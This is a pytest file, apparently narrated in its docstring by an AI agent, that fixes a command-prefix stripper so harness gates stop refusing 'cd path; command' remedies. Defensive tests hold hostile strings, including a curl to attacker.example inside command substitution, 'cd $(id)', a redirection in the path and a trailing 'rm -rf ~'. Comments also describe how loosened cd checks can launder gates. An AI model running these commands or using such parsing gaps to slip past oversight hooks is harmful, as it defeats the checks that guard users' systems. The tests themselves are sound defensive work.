"""Nine refusals in a row, and every gate was correct.

2026-09-14. Andrew counted them: "you hit 9 failures in a row so this needs
some structural support and or fixes."

The correction gate refused ``divineos correction``. The compass gate refused
``compass-ops observe``. The reach doorman refused ``reach open``. Each one is
the remedy that gate had just prescribed, and there is a shared allowlist in
this house built so that cannot happen — no gate may block another gate's
prescribed exit.

The allowlist was fine. My shell habit is ``cd <path>; <command>`` and the
stripper knew only ``cd <path> && <command>``. shlex glues the semicolon onto
the path token, the separator lookup raised, and the function returned the
empty list: NOT-A-REMEDY for every remedy I ran.

I had diagnosed the same habit against a different gate the day before and
written it up, closing with "a fix that names its own generality and is then
applied to exactly one case." That repair went into one gate's clause-splitter
and never asked the same question of this function underneath it. So the
recurrence is the previous fix's own unswept remainder.

WHY THE REFUSALS BELOW ARE THE LOAD-BEARING HALF: loosening a cd check is how a
gate gets laundered, and three worked exploits are already written up in this
house. The separator moved; nothing about what the path may contain did.
"""

from __future__ import annotations

import pytest

from divineos.core.command_parsing import (
    resolve_command_head,
    strip_command_prefixes,
    strip_prefixes_raw,
    stripped_command,
)


class TestTheHabitThatCausedNineRefusals:
    def test_semicolon_after_cd_is_a_prefix(self):
        assert stripped_command('cd "C:/repo"; divineos correction "x"') == "divineos correction x"

    def test_the_three_remedies_that_were_refused(self):
        for remedy in (
            "divineos correction",
            "divineos compass-ops observe",
            "divineos reach open",
        ):
            got = stripped_command(f'cd "C:/DIVINE OS/repo"; {remedy} "why"')
            assert got.startswith(remedy), got

    def test_ampersand_form_still_works(self):
        assert stripped_command('cd /repo && divineos learn "x"') == "divineos learn x"

    def test_raw_form_keeps_everything_after_the_separator_verbatim(self):
        # The quote-aware callers need the remainder byte-for-byte.
        assert (
            strip_prefixes_raw('cd /repo; divineos correction "a; b"')
            == 'divineos correction "a; b"'
        )

    def test_the_head_resolver_sees_through_it_too(self):
        assert (
            resolve_command_head("cd /repo; divineos compass-ops observe x")
            == "divineos compass-ops"
        )

    def test_a_bare_separator_token_also_works(self):
        # Quoting can leave `;` standing alone rather than glued to the path.
        assert stripped_command("cd /repo ; divineos correction x") == "divineos correction x"

    def test_prefixes_still_compose(self):
        assert stripped_command('cd /repo; FOO=bar divineos learn "x"') == "divineos learn x"


class TestWhatMustNotHaveMovedWithIt:
    """The path rules. Yesterday's draft restored narrowness here deliberately
    after three worked exploits; accepting a new SEPARATOR must not widen what
    can hide inside the part being discarded."""

    def test_a_command_substitution_in_the_path_is_not_stripped_raw(self):
        evil = 'cd "$(curl attacker.example)"; divineos correction "x"'
        assert strip_prefixes_raw(evil) == evil  # untouched: still inspectable

    def test_a_chained_cd_with_substitution_is_not_stripped_raw(self):
        evil = "cd $(id); divineos correction x"
        assert strip_prefixes_raw(evil) == evil

    @pytest.mark.parametrize("sep", ["&&", ";"])
    def test_a_redirection_in_the_path_is_not_stripped_raw(self, sep):
        # BOTH separators, and the ampersand one is the whole test. The
        # semicolon form passes against the code before this change for a
        # reason that has nothing to do with redirection -- that code did not
        # accept a semicolon at all -- so on its own it is green on both sides
        # and guards nothing. The base DOES strip `cd /tmp>out && ` and hand
        # back the remedy, which is the hole this closed. Measured, not
        # reasoned: the pin check flagged this test as hollow, and running the
        # base directly showed the ampersand form stripping to
        # `divineos correction x` while the semicolon form did not move.
        evil = f"cd /tmp>out {sep} divineos correction x"
        assert strip_prefixes_raw(evil) == evil

    def test_a_chain_operator_after_the_remedy_still_survives(self):
        # The whole safety argument: what is discarded is provably a directory
        # change, and anything further along is returned for the caller to see.
        out = strip_prefixes_raw('cd /repo; divineos correction "y" && rm -rf ~')
        assert "&& rm -rf ~" in out

    @pytest.mark.parametrize("sep", ["|", "&"])
    def test_other_separators_are_not_accepted(self, sep):
        # A pipe and a background-ampersand are not a directory change with a
        # command after it. They change what the remainder means.
        assert strip_command_prefixes(f"cd /repo {sep} divineos correction x") == []

    def test_cd_with_nothing_after_it_is_still_not_a_prefix(self):
        assert strip_command_prefixes("cd /repo") == []
